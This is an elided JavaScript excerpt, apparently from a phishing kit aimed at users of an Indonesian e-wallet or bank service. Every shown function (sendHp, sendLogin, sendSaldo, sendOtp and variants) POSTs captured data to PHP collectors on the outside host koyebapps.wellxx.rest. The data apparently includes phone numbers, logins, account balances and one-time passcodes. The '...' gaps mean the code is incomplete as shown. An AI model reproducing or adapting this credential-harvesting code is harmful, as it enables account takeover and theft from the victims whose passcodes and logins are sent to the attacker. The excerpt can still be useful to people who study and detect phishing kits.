function sendHp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/iyan/otpblm.php',
      type: 'POST',
